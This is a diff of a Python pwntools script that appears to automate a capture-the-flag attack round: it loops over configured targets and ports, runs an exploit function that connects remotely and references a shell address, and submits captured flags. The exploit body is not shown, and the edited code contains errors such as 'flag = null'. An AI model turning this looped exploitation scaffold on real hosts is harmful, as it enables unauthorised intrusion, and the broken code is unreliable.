@@ -2,24 +2,19 @@ from pwn import *
 from lib.submit_flag import submit_flag
 from core.data import *
 
-def pwn_run():
-    port = 3389
-    with open('web_targets.txt', 'r') as f:
-        targets = f.readlines()
-        for target in targets:
-            target = target.strip()
-            try:
-                res = pwn_exp(target, port)
-            except Exception as f:
-                print("exp出错！@")
-            #res = "flag{" + res + "}"
-            pattern = "flag\{.*\}"
-            #pattern = ".*"
-            z = re.search(pattern, res)
-            flag = z.group()
-            submit_flag(flag)  # 提交flag
 
-def pwn_exp(target, port):  #修改此处exp返回flag
+def pwn_run():
+    flag = null
+    for i in range(0, len(conf.targets)):
+        try:
+            flag = pwn_exp(conf.targets[i], conf.ports[i])
+        except Exception as f:
+            print("exp出错！@".format(conf.targets[i]))
+        if flag:
+            submit_flag(flag)
+
+
+def pwn_exp(target, port: int):  # 修改此处exp返回flag
     context.log_level = 'debug'
     p = remote(target, port)
     sh_addr = 0x400596
